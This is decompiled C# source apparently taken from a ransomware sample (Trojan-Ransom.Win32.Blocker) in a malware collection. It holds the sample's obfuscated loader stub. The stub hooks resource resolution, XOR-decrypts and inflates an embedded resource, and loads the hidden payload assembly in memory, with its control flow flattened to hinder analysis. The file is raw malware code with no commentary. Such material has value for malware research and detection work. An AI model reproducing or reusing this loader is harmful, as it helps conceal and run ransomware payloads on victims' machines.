// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: PascalBasic, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9F1074CF-37DB-4E5F-AF1E-20AEC08D3C21
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00030-msil\Trojan-Ransom.Win32.Blocker.arpl-4a543a77a4132ffcb8a680092e2edb6eba452f8fa75419627c6c71797b531de8.exe.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;

internal class \u003CModule\u003E
{
  static Assembly დ綾텝െ㔙㳊䏲㯺;

  static \u003CModule\u003E()
  {
label_0:
    AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u003CModule\u003E.ᬨ\u326A葥䣍\u2B47揺\uEA30Г);
    switch (1)
    {
      case 0:
        goto label_0;
    }
  }

  internal static Assembly ᬨ\u326A葥䣍\u2B47揺\uEA30Г(object sender, ResolveEventArgs args)
  {
label_0:
    while ((object) \u003CModule\u003E.დ綾텝െ㔙㳊䏲㯺 == null)
    {
      Stream manifestResourceStream = typeof (\u003CModule\u003E).Assembly.GetManifestResourceStream("熎핞倂鰹ט䚑\uF80B�");
      byte[] buffer = new byte[manifestResourceStream.Length];
      manifestResourceStream.Read(buffer, 0, buffer.Length);
      byte num1 = (byte) (1903588856 - 1673079988 + (1108037767 + 10306913) ^ 1348853552);
      int num2 = 5;
      int index;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_0;
          case 2:
            ++index;
            num2 = 3;
            continue;
          case 3:
            if (index >= buffer.Length)
            {
              num2 = 4;
              continue;
            }
            buffer[index] = (byte) ((uint) buffer[index] ^ (uint) num1);
            num2 = 1;
            continue;
          case 4:
            goto label_7;
          case 5:
            index = 0;
            goto case 3;
          default:
            num1 = (byte) ((int) num1 * (1858927929 - (1536480449 ^ 705652876 + (844018287 - 373842745) ^ 582287501 + 1244301204 ^ 529667620)) % (-2059955232 - 1193573756 - 1041438052));
            num2 = 2;
            continue;
        }
      }
label_7:
      BinaryReader binaryReader = new BinaryReader((Stream) new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress));
label_10:
      try
      {
        byte[] numArray = binaryReader.ReadBytes(binaryReader.ReadInt32());
        int num3 = 2;
        while (true)
        {
          switch (num3)
          {
            case 0:
              goto label_10;
            case 2:
              \u003CModule\u003E.დ綾텝െ㔙㳊䏲㯺 = Assembly.Load(numArray);
              Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
              num3 = 1;
              continue;
            default:
              goto label_16;
          }
        }
      }
      finally
      {
        binaryReader?.Dispose();
      }
    }
label_16:
    int num4 = Array.IndexOf<string>(\u003CModule\u003E.დ綾텝െ㔙㳊䏲㯺.GetManifestResourceNames(), args.Name);
    int num5 = 1;
    if (num4 == -1)
      num5 = 2;
    switch (num5)
    {
      case 0:
        goto label_16;
      case 2:
        return (Assembly) null;
      default:
        return \u003CModule\u003E.დ綾텝െ㔙㳊䏲㯺;
    }
  }
}
